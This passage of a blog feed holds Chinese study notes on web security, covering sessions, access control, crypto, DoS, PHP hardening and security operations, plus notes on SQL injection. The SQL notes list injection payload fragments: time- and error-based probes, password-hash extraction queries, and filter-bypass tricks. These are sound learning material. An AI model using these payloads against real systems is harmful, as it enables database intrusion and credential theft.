失效时间<ul><li>利用javascript 在xss攻击后将cookie 设置为永不过期</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416122938612.png" alt></li></ul></li><li>对抗<ul><li>一段时间后，强制销毁session</li><li>当用户ip，useragent 改变后，强制销毁</li><li>用户可以同时拥有几个session</li></ul></li></ul></li><li>单点登录（sso）<ul><li>openID</li></ul></li></ul><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="初探-4"><a href="#初探-4" class="headerlink" title="初探"></a>初探</h2><ul><li>What Can I Do?</li></ul><p><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416123317666.png" alt></p><pre><code>- 网络，利用路由设备或防火墙基于ip的访问控制- 操作系统- web应用    - 基于url的访问控制        - 授权用户可以访问的url![](/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416123655354.png)        -     - 基于方法的访问控制    - 基于数据的访问控制</code></pre><ul><li>垂直权限管理<ul><li>基于角色的访问控制RBAC<ul><li>用户属于不同的角色，不同的角色有不同的权限<br>-可能的问题，水平越权</li></ul></li></ul></li><li>水平权限管理<ul><li>基于数据的访问控制</li><li>使用用户组的概念，</li><li>实现一个规则引擎，<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416053926740.png" alt></li></ul></li><li>OAuth<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416054911803.png" alt>议</li></ul></li></ul><h1 id="加密算法与随机数"><a href="#加密算法与随机数" class="headerlink" title="加密算法与随机数"></a>加密算法与随机数</h1><h2 id="加密算法初探"><a href="#加密算法初探" class="headerlink" title="加密算法初探"></a>加密算法初探</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li>分组加密</li><li>流密码加密<br><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416061604134.png" alt></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li>stream cipher attack<ul><li>使用同一个密钥多次加密</li><li>reused key attack<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416061735302.png" alt></li><li>四个数据只要知道3个，就可以推到另一个，密钥C失效</li><li>增加一个初始化向量IV，使每次加密密钥不同。IV可以随意传播</li><li>bit-flipping attack<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416063243060.png" alt></li><li>当攻击者获取了普通用户a，acookie就可能伪造管理员的cookie</li><li>解决方法<ul><li>附带mac，利用哈希函数加密，hmac，解密密文和mac比较，防止密文被篡改</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416065353817.png" alt></li></ul></li></ul></li><li>弱随机IV 问题<ul><li>但若IV不够随机，暴力破解，可以出现相同的IV，仍然可以实施攻击</li></ul></li><li>wep 的破解<ul><li>IV 重复的问题</li></ul></li></ul></li><li>ECB 模式的缺陷<ul><li>分组加密的通用加密模式ECB，<ul><li>分组互不关联，改变分组的密文顺序，明文顺序同样改变<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416065917158.png" alt></li></ul></li></ul></li></ul></li><li>padding oracle attack<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416070256759.png" alt></li><li>看不懂，待填坑</li></ul></li></ul><h2 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h2><ul><li>密码系统的安全性应该依赖与密钥的复杂性，而不应该依赖算法的报名性</li><li>密钥管理的常见错误，就是将密钥硬编码在代码里<ul><li>可能因为代码的广泛传播而泄露</li><li>软件开发团队都可能看到代码</li><li>解决<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416070644168.png" alt></li></ul></li></ul></li><li>对于web应用，通常将密钥（包括密码）保存在配置文件或者数据库里</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416070803780.png" alt></li></ul><h2 id="伪随机数问题"><a href="#伪随机数问题" class="headerlink" title="伪随机数问题"></a>伪随机数问题</h2><h3 id="初探-5"><a href="#初探-5" class="headerlink" title="初探"></a>初探</h3><ul><li>随机因子不够大，被遍历</li><li>时间随机的问题<ul><li>时间可能被获取</li></ul></li><li>伪随机数算法种子破解<ul><li>系统自带的播种，多次访问结果相同</li><li>使用时间播种，可能被猜解时间</li><li>已知第一个随机数的值，可能被猜解到种子</li><li>通过发送 Keeo-Alive HTTP 头，迫使服务器使用同样进程响应请求，随机数只在开始播种一次<ul><li>web应用，很多地方都可以取得随机数，从而提供猜解的可能</li></ul></li></ul></li><li>使用安全的随机数</li><li><p>多个随机数组合<br>   <img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416090615912.png" alt>   - </p></li><li><p><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416090744533.png" alt></p></li><li></li></ul><h1 id="web-框架安全"><a href="#web-框架安全" class="headerlink" title="web 框架安全"></a>web 框架安全</h1><h2 id="MVC-框架安全"><a href="#MVC-框架安全" class="headerlink" title="MVC 框架安全"></a>MVC 框架安全</h2><ul><li>模板引擎与xss防御<ul><li>只进行html转义，为区分不同环境</li><li>慎重对待安全问题，不可盲从官方执导文档</li></ul></li><li>web框架与CSRF防御<ul><li>对读和写操作区分，csrf一般只针对写操作</li><li>利用框架对form表单添加token</li></ul></li><li>HTTP Headers 管理<ul><li>在web框架中，可以对HTTP头进行全局化处理，一些基于HTTP头的方案可以很好的实施<ul><li>对抗CRLF，只要在所有的HTTP头的value 中，编码、\r\n即可</li><li>针对302跳转，在统一的跳转函数实现白名单，或限制Locationg值</li><li>很多安全相关的headers ，可以统一在web框架中配置</li><li>框架提供统一的设置cookie函数</li></ul></li></ul></li><li>数据持久层与sql注入<ul><li>ORM框架</li></ul></li><li>其他<ul><li>文件上传</li><li>spring MVC 自带的安全功能</li><li>日志的记录</li><li>与时俱进</li></ul></li></ul><h2 id="web框架自身安全"><a href="#web框架自身安全" class="headerlink" title="web框架自身安全"></a>web框架自身安全</h2><p>开发框架可能不及时更新，引发的后果可能很严重</p><ul><li>struts 2命令执行漏洞</li><li>spring MVC 3.0.0-3.0.2 命令执行漏洞</li><li>django 0.95 命令执行漏洞</li></ul><h1 id="应用层拒绝服务攻击"><a href="#应用层拒绝服务攻击" class="headerlink" title="应用层拒绝服务攻击"></a>应用层拒绝服务攻击</h1><h2 id="初步-1"><a href="#初步-1" class="headerlink" title="初步"></a>初步</h2><ul><li>DDOS 简介<ul><li>SYN flood<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416093737635.png" alt></li></ul></li><li>UDP flood</li><li>ICMP flood</li></ul></li><li>应用层ddos<ul><li>cc 攻击<ul><li>对消耗资源大的页面不断发起正常请求，消耗服务器资源</li></ul></li><li>入侵了一个浏览很大的网站后，引流攻击</li><li>防御<ul><li>限制请求频率<ul><li>问题<ul><li>代理ip和cookie改变</li></ul></li></ul></li><li>应用代码做好性能优化</li><li>网络架构做好优化</li></ul></li></ul></li><li>验证码<ul><li>可能被识别</li><li>出现过的问题<ul><li>验证码消耗掉后，sessionID，未更新，导致原sessionID 可以一直重复提交同一个验证码</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416094943681.png" alt></li></ul></li></ul></li><li>防御应用层的DDOS<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416095114287.png" alt></li><li>调整apache 的参数</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416095334040.png" alt></li></ul></li><li>资源耗尽攻击<ul><li>slowloris 攻击<ul><li>构建一个为结束的http请求，保存连接，构建多个这样的连接</li></ul></li><li>HTTP POST DOS<ul><li>发POST 包时，指定一个很大的content-length值，然后以很低 的速度发包，构建多个这样的连接</li></ul></li><li>server limit dos<ul><li>一般web server 对http头的大小有限制</li><li>攻击者利用xss攻击，，恶意像客户端写一个超长cookie，则客户端无法访问cookie所在域的任何页面</li></ul></li></ul></li><li>reDOS<ul><li>当正则表达式写的不好时，可能被恶意利用，消耗大量资源，从而造成dos,<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416112638728.png" alt><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190416112718856.png" alt></li></ul></li></ul><h1 id="php-安全"><a href="#php-安全" class="headerlink" title="php 安全"></a>php 安全</h1><ul><li>文件包含漏洞<ul><li>include等函数通过动态变量引入需要的文件</li><li>用户可以控制该动态变量</li></ul></li><li>本地文件包含<pre><code>- 截断后续字符串    - 00截断    - 操作系统对目录的最大长度限制        - window 256        - linux 4096        - ./././ 或/// 或 ../1/abc/../1/abc</code></pre><ul><li>目录遍历 ../../ 返回到上层目录中<ul><li>可以通过不同编码方式来绕过服务端的逻辑<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190417012242664.png" alt></li></ul></li></ul></li><li>解决<ul><li>open_basedir 限制php能打开的文件在某个目录<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190417013004916.png" alt></li></ul></li><li>使用枚举<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190417013051890.png" alt></li></ul></li></ul></li></ul></li><li><p>远程文件包含</p><ul><li>需要allow_url_include 为ON，加载远程文件</li></ul></li><li><p>利用技巧</p><ul><li>包含用户上传的文件</li><li>利用data://,php:// 伪协议<ul><li>需要allow_url_include 为on</li></ul></li><li>包含session<ul><li>需要用户可以控制部分session 文件内容</li><li>php默认session 在/tmp 文件</li></ul></li><li>包含日志文件<ul><li>access_log 记录请求信息</li><li>error_log 记录出错信息<ul><li>问题<ul><li>日志数据量可能很大</li><li>凌晨包含</li></ul></li><li>常见攻击<ul><li>apache</li><li>读取httpd 的配置文件 httpd.conf,找到日志目录</li><li>错误回显泄露 web目录位置</li><li>猜解web目录位置</li></ul></li></ul></li></ul></li><li>包含/proc/self/environ 文件<ul><li>web运行的环境变量，其中很大都是用户可以控制的，</li><li>常见做法在user-agent 注入php代码</li><li></li><li></li></ul></li><li>包含上传的临时文件（RFC1867协议）<ul><li>php为上传的文件创建临时文件，目录在php.ini upload_tmp_dir 中定义，默认为空，此时linux 使用/tmp 目录，windows使用c:\windows\temp 目录</li><li>随机函数不够安全，暴力猜解成为可能</li></ul></li><li>包含其他应用创建的文件，比如数据库文件，缓存文件，应用日志等</li></ul></li></ul><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><ul><li><p>全局变量覆盖</p><ul><li>register_glabals <ul><li>php 4.2.0 之后默认有ON改为OFF</li><li>为on，变量可能来自不同地方，表单，cookie等，可能导致变量覆盖<ul><li>通过代码销毁<img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418102732598.png" alt><ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418102946431.png" alt></li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418103005365.png" alt></li></ul></li></ul></li></ul></li><li>extract() 变量覆盖<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418103118891.png" alt></li><li>值为EXTR_OVERWRITE时，变量导入时，会覆盖已有变量，缺省为此配置，第二个参数表示不覆盖</li></ul></li><li>$$key 的可能变量覆盖</li><li>import_request_variables 变量覆盖<ul><li>将GET,POST,COOKIE的变量导入全局，只需要简单的指定类型，不指定默认覆盖全局变量</li></ul></li><li>parse_str() 变量覆盖，mb_parse_str()<ul><li>解析url，如果指定第二个参数则存入该参数，否则导入全局</li></ul></li></ul></li><li><p>代码执行漏洞</p><ul><li>危险函数代码执行<ul><li>文件包含漏洞</li><li>危险函数eval(),popen(),system(),passthru(),exec()</li><li>应用写入服务器的文件内容和文件类型</li></ul></li><li>其他执行代码的方式<ul><li>直接执行代码的函数</li><li>文件包含</li><li>本地文件写入</li><li>preg_replace 代码执行<ul><li>第一个参数如果存在/e 修饰符，则允许第一个或者第二个参数代码执行</li></ul></li><li>动态函数执行<ul><li>用户自定义的函数可以导致代码执行</li></ul></li><li>curly syntax<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418110401084.png" alt></li></ul></li><li>回调函数执行代码<ul><li>如果回调函数可控</li></ul></li><li>unserialize() 导致代码执行<ul><li>变量反序化</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418110644650.png" alt></li></ul></li></ul></li></ul></li><li>定制安全的php环境<ul><li>php.ini<ul><li>register_globals</li><li>open_basedir</li><li>allow_url_fopen</li><li>allow_url_include</li><li>display_errors</li><li>log_erroes</li><li>magic_quotes_gpc</li><li>cgi.fix_pathinfo<ul><li>关闭此选项避免，CGI，文件解析问题</li></ul></li><li>session.cookie_httponly</li><li>session.cookie_secure</li><li>safe_mode<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418112011049.png" alt></li><li>加载了一些非官方的php 扩展，扩展自带函数则可能绕过safe_mode</li><li>此模式php6 被取消</li></ul></li><li>disble_functions 在php 中禁用函数</li></ul></li></ul></li></ul><h1 id="web-server-配置安全"><a href="#web-server-配置安全" class="headerlink" title="web server 配置安全"></a>web server 配置安全</h1><ul><li>apache 安全<ul><li>非官方module </li><li>为apache 单独建立一个user/group</li><li>配置参数，对抗DDOs</li><li>保护好apache log</li></ul></li><li>nginx<ul><li>自身服务器安全</li></ul></li><li>JBoss 远程命令执行<ul><li>默认安装会带一个管理后台，通过8080端口，访问/jmx-console 能够进入</li><li>可以远程加载war 包，导致命令执行</li></ul></li><li>tomcat 远程命令执行<ul><li>默认8080端口又后台</li></ul></li><li>HTTP Parameter Pollution<ul><li>通过GET POST 发送两个相同的参数，服务器如何选择</li><li>有些只取第一个</li><li>有些如.net 变成 a = test,test1</li><li>绕过一些服务器的逻辑判断</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418065724831.png" alt><ul><li>HPP攻击</li></ul></li></ul></li></ul><h1 id="互联网公司安全运营"><a href="#互联网公司安全运营" class="headerlink" title="互联网公司安全运营"></a>互联网公司安全运营</h1><h2 id="互联网业务安全"><a href="#互联网业务安全" class="headerlink" title="互联网业务安全"></a>互联网业务安全</h2><ul><li>产品需要什么样的安全<ul><li>安全方案的设计避免业务的冲突</li><li>互联网产品对安全的需求<ul><li>具备了安全性，产品才是完整的</li><li>安全做好了，产品才能最终成熟</li></ul></li><li>什么是好的安全方案<ul><li>有效的解决问题</li><li>良好的用户体验</li><li>优秀的性能<ul><li>认证<ul><li>双因素认证用户体验问题</li><li>复杂密码安全吗？</li></ul></li></ul></li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418070913650.png" alt></li></ul></li></ul></li><li>业务逻辑安全<pre><code>- 两套账号体系，绑定关系，只改一个- 登录失败锁定账号一小时，竞拍网站，恶意登录，锁定出高价用户的账号- 信息审核后发布，允许修改，修改后未审核</code></pre><ul><li>密码取回流程<ul><li>改密码<ul><li>进行敏感操作之前再次认证用户身份</li></ul></li><li>密码取回流程<ul><li>三种方法<ul><li>安全问题，安全邮箱，手机短信验证码</li></ul></li><li>认证信息可能之前被修改</li><li>给用户多种认证选择</li><li>三种都不可靠时，利用用户在网站留下的私有信息，类似qq的申述</li></ul></li></ul></li></ul></li><li>账号如何被盗的<ul><li>账号被盗的途径<ul><li>登录过程无HTTPS</li><li>用户电脑中木马，记录键盘</li><li>钓鱼网站</li><li>登录入口别暴力破解</li><li>取回流程的逻辑漏洞</li><li>xss漏洞，被间接窃取</li><li>sql注入漏洞</li><li>问题<ul><li>暴力破解<ul><li>常用密码</li><li>网络嗅探</li><li>数据库明文密码</li></ul></li></ul></li><li>分析账号被盗的原因<ul><li>事先考虑问题的可能性，有针对性的向客户提问题，大胆假设，小心求证</li><li>从日志中寻找证据</li><li>打入敌人内部</li></ul></li></ul></li></ul></li><li>互联网的垃圾<ul><li>垃圾的危害<ul><li>垃圾注册<ul><li>新用户奖励机制</li><li>发广告和推广信息</li></ul></li></ul></li><li>垃圾的处理<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418074015686.png" alt></li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418074035611.png" alt></li></ul></li></ul></li><li><p>网络钓鱼</p><ul><li>简介<ul><li>仿冒网站</li><li>欺骗性域名</li><li>传播途径</li></ul></li><li>邮件钓鱼<ul><li>SMTP协议可以由用户伪造发件人邮箱</li><li>识别发件人的安全技术，基于域名策略<ul><li>SPF技术，</li><li>Yahoo 的DomKeys 使用公私钥</li><li>微软的Sender ID技术 基于SPF，ip策略</li><li>SPF 基于ip难以维护</li></ul></li></ul></li><li>钓鱼网站的防控<ul><li>控制钓鱼网站传播的途径<ul><li>多方合作</li><li>浏览器</li></ul></li><li>直接打击</li><li>用户教育</li><li>自动化识别<ul><li>url，域名 0 l，源码的相似性</li></ul></li></ul></li><li>网购流程的钓鱼<ul><li>网购流程中每个平台都有一套自己的账户体系，没有对应关系，不知道谁完成了订单</li><li>账户信息难以对应</li><li>使用客户端ip做完统一信息，比较经济</li></ul></li><li>用户隐私保护<ul><li>互联网用户隐私挑战<ul><li>精准的广告投放<ul><li>用户在网站填写的个人信息</li><li>搜索记录</li><li>ip地址对应的物理地址</li></ul></li><li>如何保护用户隐私<ul><li>用户因该有知情权和选择权</li><li>网站应该妥善保管，不用于指定范围的其他用途</li></ul></li><li>Do-Not_Track<ul><li>http增加一个header 头，告诉网站用户不想被追踪</li><li>输入法云端分析需求，职业</li><li>iphone，安卓跟踪位置<h2 id="安全开发流程（SDL）"><a href="#安全开发流程（SDL）" class="headerlink" title="安全开发流程（SDL）"></a>安全开发流程（SDL）</h2></li></ul></li></ul></li></ul></li></ul></li><li><p>简介</p><ul><li>安全开发生命周期</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418082213768.png" alt></li></ul></li><li>敏捷SDL<ul><li>瀑布法开发<ul><li>微软的SDL不适合敏捷开发</li><li>敏捷SDL</li></ul></li></ul></li><li>SDL 实战经验<ul><li>与项目经理进行充分的沟通，派出足够的时间</li><li>规范立项流程，确保所有项目都通知安全团队</li><li>树立安全部门的权威，项目必须由安全部门审核</li><li>将技术方案写入开发，测试的工作手册中</li><li>给工程师培训安全方案</li><li>记录所有安全的bug鼓励程序员写安全代码</li></ul></li><li>需求分析与设计阶段<ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418083323876.png" alt><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418083333644.png" alt><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418083352732.png" alt><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418083406237.png" alt></li></ul></li><li>开发阶段<ul><li>提供安全的函数<ul><li>ESAPI</li><li>将安全方案写入开发规范中</li></ul></li><li>代码安全审计工具<ul><li>找敏感函数，回溯</li><li>找用户可能的输入口，看传递情况</li><li>对于甲方公司，</li></ul></li></ul></li></ul><h2 id="安全运营"><a href="#安全运营" class="headerlink" title="安全运营"></a>安全运营</h2><ul><li><p>把安全运营起来</p><ul><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418084018486.png" alt></li><li>安全是一个持续的过程</li><li><img src="/old_post/images/atricleImages/images/atricleImages/白帽子讲web安全笔记/20190418084104980.png" alt></li></ul></li><li><p>漏洞修补流程</p></li><li>安全监控<ul><li>捕捉异常流程</li></ul></li><li>入侵检测<ul><li>IDS,IPS,DDOS监控设备,WAF,</li><li>modsecurity</li><li>phpids</li></ul></li><li>紧急响应处理流程<ul><li>邮件报警</li><li>IM报警</li><li>短信报警</li><li>紧急响应小组<ul><li>保护安全事件的现场</li><li>最快的速度处理问题</li></ul></li><li></li></ul></li><li></li><li></li><li></li><li></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="白帽子讲web安全" scheme="http://blog.wendelltong.xyz/tags/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>sql注入攻击与防御笔记</title>
    <link href="http://blog.wendelltong.xyz/old_post/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E7%AC%94%E8%AE%B0.html"/>
    <id>http://blog.wendelltong.xyz/old_post/sql注入攻击与防御笔记.html</id>
    <published>2019-04-13T02:31:30.000Z</published>
    <updated>2019-04-23T01:10:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>笔记<br><a id="more"></a></p><h1 id="sql基本利用"><a href="#sql基本利用" class="headerlink" title="sql基本利用"></a>sql基本利用</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p><img src="https://upload-images.jianshu.io/upload_images/15848102-1ef65733bebc686c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="新文档 2019-04-19 15.11.19_3.jpg"></p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p><img src="https://upload-images.jianshu.io/upload_images/15848102-46bedc062e332934.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="新文档 2019-04-19 15.11.19_1.jpg"><br><img src="https://upload-images.jianshu.io/upload_images/15848102-0b078431e3f08c47.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="新文档 2019-04-19 15.11.19_2.jpg"></p><h3 id="使用条件语句"><a href="#使用条件语句" class="headerlink" title="使用条件语句"></a>使用条件语句</h3><h4 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h4><ul><li><p>mysql</p><ul><li>BENCHMARK(10000,sha1(‘blah’));</li><li>mysql 5.0.12版本以后 sleep()<h4 id="基于错误"><a href="#基于错误" class="headerlink" title="基于错误"></a>基于错误</h4></li></ul></li><li><p>?id = 1/返回值</p></li><li></li></ul><h4 id="基于内容"><a href="#基于内容" class="headerlink" title="基于内容"></a>基于内容</h4><p>-？id = 1%2B(返回值) </p><h4 id="处理字符串"><a href="#处理字符串" class="headerlink" title="处理字符串"></a>处理字符串</h4><ul><li>？brand=ac’%2B’char(108+(返回值))’%2B’e</li></ul><h4 id="扩展攻击"><a href="#扩展攻击" class="headerlink" title="扩展攻击"></a>扩展攻击</h4><ul><li>len() 获取长度</li><li><blockquote><p>10/(case+when+(len(user())&gt;8)+then+1+else+0end)</p></blockquote></li><li><p>ascii(substring((select system_user),1,1))<br>-</p><h4 id="利用sql注入错误"><a href="#利用sql注入错误" class="headerlink" title="利用sql注入错误"></a>利用sql注入错误</h4></li><li><p>？id = char(65+返回值)</p><ul><li>触发强制类型转换错误，可以得到a或b</li></ul></li><li>？id = 1+having+1=1<ul><li>错误消息会返回一个表名和列名</li><li>?id=1+group+by+products.id,products.name+having+1=1</li><li>不断遍历，得到后面的列</li></ul></li><li>其他错误,xml函数</li></ul><h3 id="枚举数据库模式"><a href="#枚举数据库模式" class="headerlink" title="枚举数据库模式"></a>枚举数据库模式</h3><ul><li>information_schema mysql5以后</li><li>暴力猜解表名</li><li><img src="/old_post/images/atricleImages/sql注入攻击与防御笔记/20190419042706644.png" alt></li></ul><h3 id="在insert中实施注入攻击"><a href="#在insert中实施注入攻击" class="headerlink" title="在insert中实施注入攻击"></a>在insert中实施注入攻击</h3><ul><li>使用单引号闭合，插入子查询，利用注释闭合后面语句</li><li>可控制字符是最后 一个参数，<ul><li>利用整数和最后一个字符串相加返回整数</li><li>利用ascii 转化整数</li></ul></li><li>利用insert 错误<ul><li><img src="/old_post/images/atricleImages/sql注入攻击与防御笔记/20190419052938792.png" alt></li><li>使内部子查询成功，外部insert失败，避免污染数据库<ul><li>子查询返回两行错误查询将终止</li><li><img src="/old_post/sql注入攻击与防御笔记/20190419054142349.png" alt></li><li>后面union 确保返回两行数据</li><li>基于时间速度慢<ul><li><img src="/old_post/sql注入攻击与防御笔记/20190419054347041.png" alt></li><li>利用regexp 可在在应用层返回错误不同查询</li></ul></li></ul></li></ul></li><li>其他情况<ul><li>堆叠查询<ul><li>插入管理员账户</li></ul></li></ul></li></ul><h3 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h3><h3 id="窃取哈希口令"><a href="#窃取哈希口令" class="headerlink" title="窃取哈希口令"></a>窃取哈希口令</h3><ul><li>select user,password FROM mysql.user</li></ul><h3 id="带外通信"><a href="#带外通信" class="headerlink" title="带外通信"></a>带外通信</h3><ul><li>e-mail</li><li>HTTP/DNS</li><li><ul><li><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3></li></ul></li></ul><h2 id="自动化利用"><a href="#自动化利用" class="headerlink" title="自动化利用"></a>自动化利用</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><h2 id="寻找并确认SQL盲注"><a href="#寻找并确认SQL盲注" class="headerlink" title="寻找并确认SQL盲注"></a>寻找并确认SQL盲注</h2><h3 id="强制产生通用错误"><a href="#强制产生通用错误" class="headerlink" title="强制产生通用错误"></a>强制产生通用错误</h3><ul><li>应用程序经常使用通用的错误页面替换数据库错误</li><li>提交单引号推断sql注入是否可行</li></ul><h3 id="注入带副作用的查询"><a href="#注入带副作用的查询" class="headerlink" title="注入带副作用的查询"></a>注入带副作用的查询</h3><ul><li>sleep()</li><li>‘ and ‘1’ = ‘2</li></ul><h3 id="拆分与平衡"><a href="#拆分与平衡" class="headerlink" title="拆分与平衡"></a>拆分与平衡</h3><ul><li>2+5 代替 5</li><li>a’||’b</li></ul><h3 id="常见的sql盲注场景"><a href="#常见的sql盲注场景" class="headerlink" title="常见的sql盲注场景"></a>常见的sql盲注场景</h3><ul><li>无效查询返回通用的错误页面，正确的查询返回内容可被适度控制的页面，</li><li></li><li><p>提交受损或不正确的SQL，既不产生错误页面，也不会以任何方式影响页面</p><ul><li>基于时间的盲注，或者带外副作用的漏洞</li></ul></li><li><p>注入方法</p><ul><li>二分法</li><li>位运算</li></ul></li></ul><h3 id="基于时间的技术"><a href="#基于时间的技术" class="headerlink" title="基于时间的技术"></a>基于时间的技术</h3><ul><li>sleep()</li><li>benchmark</li></ul><h3 id="使用非主流通道"><a href="#使用非主流通道" class="headerlink" title="使用非主流通道"></a>使用非主流通道</h3><ul><li>数据库连接</li><li>DNS渗漏</li><li>e-mail 渗漏</li><li>http渗漏</li><li>ICMP 渗漏</li></ul><h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><ul><li>udf</li><li>mof</li></ul><h1 id="高级话题"><a href="#高级话题" class="headerlink" title="高级话题"></a>高级话题</h1><h2 id="避开输入过滤器"><a href="#避开输入过滤器" class="headerlink" title="避开输入过滤器"></a>避开输入过滤器</h2><ul><li>大小写</li><li>sql注释<ul><li>/<em>!4501</em>/</li><li>un/**/ion</li></ul></li><li>url 编码<ul><li>双url编码</li><li>非标准unicode 编码</li></ul></li><li>eval动态执行<ul><li>拼接字符串</li></ul></li><li>空字节攻击<ul><li>00截断</li></ul></li><li>只过滤一次</li><li>利用截断<ul><li>输入过滤器截断输入为16个字符，替换单引号为双引号</li><li>利用截断，把引号放在第16位，成功闭合前面</li><li>其他截断攻击<ul><li>邮箱  很多空字节  攻击者邮箱</li></ul></li></ul></li><li>避开自定义过滤器<ul><li>利用过滤器对字符串的处理</li></ul></li><li><p>使用非标准入口</p><ul><li>参数名</li><li>应用可能分析referer 获取用户如何进入的数据，可能存在注入<h2 id="二阶sql注入"><a href="#二阶sql注入" class="headerlink" title="二阶sql注入"></a>二阶sql注入</h2></li></ul><ul><li>输入数据经过转义进入数据库，再次从数据库拿出来，拼接sql，可能会绕过之前的转义<ul><li><h2 id="客户端sql注入"><a href="#客户端sql注入" class="headerlink" title="客户端sql注入"></a>客户端sql注入</h2></li></ul></li></ul></li><li><p>html5访问本地数据库</p></li><li></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="sql注入攻击与防御" scheme="http://blog.wendelltong.xyz/tags/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php学习笔记</title>
